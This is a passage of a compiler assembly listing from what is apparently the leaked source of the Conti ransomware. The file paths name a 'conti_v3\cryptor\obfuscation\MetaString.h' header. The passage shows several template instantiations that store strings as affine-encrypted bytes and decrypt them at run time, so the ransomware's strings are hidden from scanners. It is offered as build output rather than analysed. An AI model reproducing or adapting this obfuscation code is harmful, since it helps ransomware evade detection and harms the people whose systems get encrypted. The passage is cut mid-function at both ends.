  00013	c6 41 05 69	 mov	 BYTE PTR [rcx+5], 105	; 00000069H
  00017	c6 41 06 27	 mov	 BYTE PTR [rcx+6], 39	; 00000027H
  0001b	c6 41 07 6a	 mov	 BYTE PTR [rcx+7], 106	; 0000006aH
  0001f	c6 41 08 27	 mov	 BYTE PTR [rcx+8], 39	; 00000027H
  00023	c6 41 09 27	 mov	 BYTE PTR [rcx+9], 39	; 00000027H
  00027	c6 41 0a 27	 mov	 BYTE PTR [rcx+10], 39	; 00000027H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 3a 00 00 00	 mov	 eax, 58			; 0000003aH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 7a	 mov	 BYTE PTR [rcx+1], 122	; 0000007aH
  00007	c6 41 02 3a	 mov	 BYTE PTR [rcx+2], 58	; 0000003aH
  0000b	c6 41 03 37	 mov	 BYTE PTR [rcx+3], 55	; 00000037H
  0000f	c6 41 04 3a	 mov	 BYTE PTR [rcx+4], 58	; 0000003aH
  00013	c6 41 05 78	 mov	 BYTE PTR [rcx+5], 120	; 00000078H
  00017	c6 41 06 3a	 mov	 BYTE PTR [rcx+6], 58	; 0000003aH
  0001b	c6 41 07 50	 mov	 BYTE PTR [rcx+7], 80	; 00000050H
  0001f	c6 41 08 3a	 mov	 BYTE PTR [rcx+8], 58	; 0000003aH
  00023	c6 41 09 3a	 mov	 BYTE PTR [rcx+9], 58	; 0000003aH
  00027	c6 41 0a 3a	 mov	 BYTE PTR [rcx+10], 58	; 0000003aH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 15	 sub	 ecx, 21

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 32	 mov	 BYTE PTR [rcx+1], 50	; 00000032H
  00007	c6 41 02 15	 mov	 BYTE PTR [rcx+2], 21
  0000b	c6 41 03 65	 mov	 BYTE PTR [rcx+3], 101	; 00000065H
  0000f	c6 41 04 15	 mov	 BYTE PTR [rcx+4], 21
  00013	c6 41 05 3d	 mov	 BYTE PTR [rcx+5], 61	; 0000003dH
  00017	c6 41 06 15	 mov	 BYTE PTR [rcx+6], 21
  0001b	c6 41 07 49	 mov	 BYTE PTR [rcx+7], 73	; 00000049H
  0001f	c6 41 08 15	 mov	 BYTE PTR [rcx+8], 21
  00023	c6 41 09 0b	 mov	 BYTE PTR [rcx+9], 11
  00027	c6 41 0a 15	 mov	 BYTE PTR [rcx+10], 21
  0002b	c6 41 0b 15	 mov	 BYTE PTR [rcx+11], 21
  0002f	c6 41 0c 15	 mov	 BYTE PTR [rcx+12], 21
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 0c 00 00 00	 mov	 eax, 12
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 50	 mov	 BYTE PTR [rcx+1], 80	; 00000050H
  00007	c6 41 02 0c	 mov	 BYTE PTR [rcx+2], 12
  0000b	c6 41 03 70	 mov	 BYTE PTR [rcx+3], 112	; 00000070H
  0000f	c6 41 04 0c	 mov	 BYTE PTR [rcx+4], 12
  00013	c6 41 05 69	 mov	 BYTE PTR [rcx+5], 105	; 00000069H
  00017	c6 41 06 0c	 mov	 BYTE PTR [rcx+6], 12
  0001b	c6 41 07 5a	 mov	 BYTE PTR [rcx+7], 90	; 0000005aH
  0001f	c6 41 08 0c	 mov	 BYTE PTR [rcx+8], 12
  00023	c6 41 09 0c	 mov	 BYTE PTR [rcx+9], 12
  00027	c6 41 0a 0c	 mov	 BYTE PTR [rcx+10], 12
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 73	 sub	 ecx, 115		; 00000073H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 05	 mov	 BYTE PTR [rcx+1], 5
  00007	c6 41 02 73	 mov	 BYTE PTR [rcx+2], 115	; 00000073H
  0000b	c6 41 03 0d	 mov	 BYTE PTR [rcx+3], 13
  0000f	c6 41 04 73	 mov	 BYTE PTR [rcx+4], 115	; 00000073H
  00013	c6 41 05 24	 mov	 BYTE PTR [rcx+5], 36	; 00000024H
  00017	c6 41 06 73	 mov	 BYTE PTR [rcx+6], 115	; 00000073H
  0001b	c6 41 07 60	 mov	 BYTE PTR [rcx+7], 96	; 00000060H
  0001f	c6 41 08 73	 mov	 BYTE PTR [rcx+8], 115	; 00000073H
  00023	c6 41 09 73	 mov	 BYTE PTR [rcx+9], 115	; 00000073H
  00027	c6 41 0a 73	 mov	 BYTE PTR [rcx+10], 115	; 00000073H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 08 00 00
	00		 mov	 r10d, 8
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 24 00 00 00	 mov	 eax, 36			; 00000024H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
